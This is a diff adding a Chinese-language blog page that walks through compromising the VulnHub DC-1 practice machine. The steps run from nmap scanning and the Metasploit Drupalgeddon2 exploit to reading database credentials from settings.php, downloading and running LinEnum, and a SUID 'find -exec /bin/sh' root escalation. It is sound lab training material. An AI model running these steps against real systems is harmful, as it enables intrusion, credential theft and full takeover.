@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      DC-1靶机渗透 | blogs 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+      <meta name="author" content="ki..">
+    
+    
+
+    <meta name="description" content="一、信息搜集1.安装DC-1靶机到虚拟机上下载地址 2.局域网内主机发现(使用kali虚拟机查询DC-1的ip地址)1root@kali:~# nmap -sP 192.168.108.0/24 由于kali虚拟机的IP地址为192.168.108.140，所以靶机的IP地址为192.168.108.129 3.使用nmap查看靶机开放端口1root@kali:~# nmap 192.168.10">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC-1靶机渗透 | blogs">
+<meta property="og:url" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/index.html">
+<meta property="og:site_name" content="blogs">
+<meta property="og:description" content="一、信息搜集1.安装DC-1靶机到虚拟机上下载地址 2.局域网内主机发现(使用kali虚拟机查询DC-1的ip地址)1root@kali:~# nmap -sP 192.168.108.0/24 由于kali虚拟机的IP地址为192.168.108.140，所以靶机的IP地址为192.168.108.129 3.使用nmap查看靶机开放端口1root@kali:~# nmap 192.168.10">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/1-1.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/1-2.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/1-3.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/1-4.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/2-1.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/2-2.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/2-3.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/2-4.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/3-1.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/3-2.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/3-3.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/3-4.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/4-1.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/4-2.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/4-3.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/4-4.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/4-5.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/4-6.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/5-1.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/5-2.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/5-3.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/5-4.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/5-5-1.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/5-5-2.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/5-6.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/5-6-2.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/5-6-3.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/5-6-4.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/5-7.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/5-8-1.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/5-8-2.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/5-8-3.png">
+<meta property="og:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/5-9.png">
+<meta property="og:updated_time" content="2019-10-18T10:47:58.535Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DC-1靶机渗透 | blogs">
+<meta name="twitter:description" content="一、信息搜集1.安装DC-1靶机到虚拟机上下载地址 2.局域网内主机发现(使用kali虚拟机查询DC-1的ip地址)1root@kali:~# nmap -sP 192.168.108.0/24 由于kali虚拟机的IP地址为192.168.108.140，所以靶机的IP地址为192.168.108.129 3.使用nmap查看靶机开放端口1root@kali:~# nmap 192.168.10">
+<meta name="twitter:image" content="https://zoeyeeeeeee.github.io/2019/10/18/DC-1靶机渗透/1-1.png">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">blogs</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+                
+                <li class="navigation__item"><a href="/links" title="" class="">友链</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">DC-1靶机渗透</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2019-10-18" class="post-meta__date date">2019-10-18</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+
+      </span>
+    </div>
+    
+
+
+	 
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <h2 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h2><h3 id="1-安装DC-1靶机到虚拟机上"><a href="#1-安装DC-1靶机到虚拟机上" class="headerlink" title="1.安装DC-1靶机到虚拟机上"></a>1.安装DC-1靶机到虚拟机上</h3><p><a href="https://www.vulnhub.com/entry/dc-1-1,292/" target="_blank" rel="noopener">下载地址</a></p>
+<h3 id="2-局域网内主机发现-使用kali虚拟机查询DC-1的ip地址"><a href="#2-局域网内主机发现-使用kali虚拟机查询DC-1的ip地址" class="headerlink" title="2.局域网内主机发现(使用kali虚拟机查询DC-1的ip地址)"></a>2.局域网内主机发现(使用kali虚拟机查询DC-1的ip地址)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sP 192.168.108.0/24</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/1-1.png" alt=""><br>由于kali虚拟机的IP地址为192.168.108.140，所以靶机的IP地址为192.168.108.129</p>
+<h3 id="3-使用nmap查看靶机开放端口"><a href="#3-使用nmap查看靶机开放端口" class="headerlink" title="3.使用nmap查看靶机开放端口"></a>3.使用nmap查看靶机开放端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap 192.168.108.129</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/1-2.png" alt=""><br>开放端口为22,80,111</p>
+<h3 id="4-使用nmap查看端口对应版本-p-80-指定80端口；-p-扫描0-65535全部端口"><a href="#4-使用nmap查看端口对应版本-p-80-指定80端口；-p-扫描0-65535全部端口" class="headerlink" title="4.使用nmap查看端口对应版本(-p 80 指定80端口；-p- 扫描0-65535全部端口)"></a>4.使用nmap查看端口对应版本(-p 80 指定80端口；-p- 扫描0-65535全部端口)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sV -p- 192.168.108.129</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/1-3.png" alt=""></p>
+<h3 id="5-访问靶机的80端口，查看页面的CMS系统"><a href="#5-访问靶机的80端口，查看页面的CMS系统" class="headerlink" title="5.访问靶机的80端口，查看页面的CMS系统"></a>5.访问靶机的80端口，查看页面的CMS系统</h3><p><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/1-4.png" alt=""><br>查看到页面的CMS系统为Drupal</p>
+<h2 id="二、漏洞挖掘"><a href="#二、漏洞挖掘" class="headerlink" title="二、漏洞挖掘"></a>二、漏洞挖掘</h2><h3 id="1-启动msf，搜索drupal漏洞"><a href="#1-启动msf，搜索drupal漏洞" class="headerlink" title="1.启动msf，搜索drupal漏洞"></a>1.启动msf，搜索drupal漏洞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; Search Drupal</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/2-1.png" alt=""></p>
+<h3 id="2-找到最新的exploit进行利用"><a href="#2-找到最新的exploit进行利用" class="headerlink" title="2.找到最新的exploit进行利用"></a>2.找到最新的exploit进行利用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; Search Drupal</span><br><span class="line">msf5 &gt; use exploit/unix/webapp/drupal_restws_unserialize</span><br><span class="line">show options</span><br><span class="line">set lhost 190.168.108.140</span><br><span class="line">set rhost 192.168.108.129</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/2-2.png" alt=""><br><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/2-3.png" alt=""><br><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/2-4.png" alt=""><br>run后未成功执行RCE,继续尝试使用2018的exploit</p>
+<h3 id="3-使用2018年的drupal-drupalgeddon2进行攻击"><a href="#3-使用2018年的drupal-drupalgeddon2进行攻击" class="headerlink" title="3.使用2018年的drupal_drupalgeddon2进行攻击"></a>3.使用2018年的drupal_drupalgeddon2进行攻击</h3><p><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/3-1.png" alt=""></p>
+<h3 id="4-使用该模块并观察其参数的配置"><a href="#4-使用该模块并观察其参数的配置" class="headerlink" title="4.使用该模块并观察其参数的配置"></a>4.使用该模块并观察其参数的配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">show options</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/3-2.png" alt=""></p>
+<h3 id="5-配置攻击机和靶机的ip地址并运行"><a href="#5-配置攻击机和靶机的ip地址并运行" class="headerlink" title="5.配置攻击机和靶机的ip地址并运行"></a>5.配置攻击机和靶机的ip地址并运行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set lhost 190.168.108.140</span><br><span class="line">set rhost 192.168.108.129</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/3-3.png" alt=""><br><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/3-4.png" alt=""></p>
+<h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><h3 id="1-sysinfo是用来获取系统相关信息的结构体"><a href="#1-sysinfo是用来获取系统相关信息的结构体" class="headerlink" title="1.sysinfo是用来获取系统相关信息的结构体"></a>1.sysinfo是用来获取系统相关信息的结构体</h3><p><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/4-1.png" alt=""></p>
+<h3 id="2-查看当前目录（pwd）"><a href="#2-查看当前目录（pwd）" class="headerlink" title="2.查看当前目录（pwd）"></a>2.查看当前目录（pwd）</h3><p><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/4-2.png" alt=""></p>
+<h3 id="3-通过shell查看部分信息"><a href="#3-通过shell查看部分信息" class="headerlink" title="3.通过shell查看部分信息"></a>3.通过shell查看部分信息</h3><p><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/4-3.png" alt=""><br><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/4-4.png" alt=""><br>进入home目录查看，寻找到flag<br><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/4-5.png" alt=""><br>查看flag4的内容<br><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/4-6.png" alt=""></p>
+<h2 id="四、提权"><a href="#四、提权" class="headerlink" title="四、提权"></a>四、提权</h2><h3 id="1-搜索kali自带的searchsploit来搜索exploitdb中的漏洞利用代码"><a href="#1-搜索kali自带的searchsploit来搜索exploitdb中的漏洞利用代码" class="headerlink" title="1.搜索kali自带的searchsploit来搜索exploitdb中的漏洞利用代码"></a>1.搜索kali自带的searchsploit来搜索exploitdb中的漏洞利用代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit 3.2.0</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/5-1.png" alt=""></p>
+<h3 id="2-使用ls查看当前目录下的文件"><a href="#2-使用ls查看当前目录下的文件" class="headerlink" title="2.使用ls查看当前目录下的文件"></a>2.使用ls查看当前目录下的文件</h3><p><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/5-2.png" alt=""></p>
+<h3 id="3-查看flag1-txt内容"><a href="#3-查看flag1-txt内容" class="headerlink" title="3.查看flag1.txt内容"></a>3.查看flag1.txt内容</h3><p><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/5-3.png" alt=""><br>根据第一条提示显示：需要去找drupal的配置文件。drupal的配置文件默认位置位于sites/default/settings.php<br><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/5-4.png" alt=""></p>
+<h3 id="4-查看settings-php内容，得到了flag2和本机mysql的一组用户名和密码"><a href="#4-查看settings-php内容，得到了flag2和本机mysql的一组用户名和密码" class="headerlink" title="4.查看settings.php内容，得到了flag2和本机mysql的一组用户名和密码"></a>4.查看settings.php内容，得到了flag2和本机mysql的一组用户名和密码</h3><p><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/5-5-1.png" alt=""><br><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/5-5-2.png" alt=""></p>
+<h3 id="5-LinEnum-sh-查看弱点"><a href="#5-LinEnum-sh-查看弱点" class="headerlink" title="5.LinEnum.sh 查看弱点"></a>5.LinEnum.sh 查看弱点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/5-6.png" alt=""><br>ls查看文件夹下内容<br><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/5-6-2.png" alt=""></p>
+<h3 id="6-chmod修改权限后执行提权脚本"><a href="#6-chmod修改权限后执行提权脚本" class="headerlink" title="6.chmod修改权限后执行提权脚本"></a>6.chmod修改权限后执行提权脚本</h3><p><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/5-6-3.png" alt=""></p>
+<h3 id="7-查看到脚本出现下图所示内容"><a href="#7-查看到脚本出现下图所示内容" class="headerlink" title="7.查看到脚本出现下图所示内容"></a>7.查看到脚本出现下图所示内容</h3><p><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/5-6-4.png" alt=""><br>注：这个也可以通过这个命令直接查看，命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/5-7.png" alt=""></p>
+<h3 id="8-创建一个空文件-叫-anqke"><a href="#8-创建一个空文件-叫-anqke" class="headerlink" title="8.创建一个空文件 叫 anqke"></a>8.创建一个空文件 叫 anqke</h3><p><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/5-8-1.png" alt=""><br><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/5-8-2.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find anqke -exec &apos;whoami&apos; \;  (注：命令结尾这个“;”必须要加)</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/5-8-3.png" alt=""></p>
+<h3 id="9-能直接带入命令，且是root权限，最后直接执行exp"><a href="#9-能直接带入命令，且是root权限，最后直接执行exp" class="headerlink" title="9.能直接带入命令，且是root权限，最后直接执行exp"></a>9.能直接带入命令，且是root权限，最后直接执行exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find anqke -exec &apos;/bin/sh&apos; \;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/18/DC-1靶机渗透/../DC-1靶机渗透/5-9.png" alt=""></p>
+
+  </section>
+
+  <section class="post-comments">
+
+    <!-- 将评论系统（例如Disqus、多说、友言、畅言等）提供的代码片段粘贴在这里 -->
+    
+</section>
+
+
+</article>
+
+
+            <footer class="footer">
+
+    <span class="footer__copyright">&copy; 2014-2015. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a></span>
+    
+</footer>
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
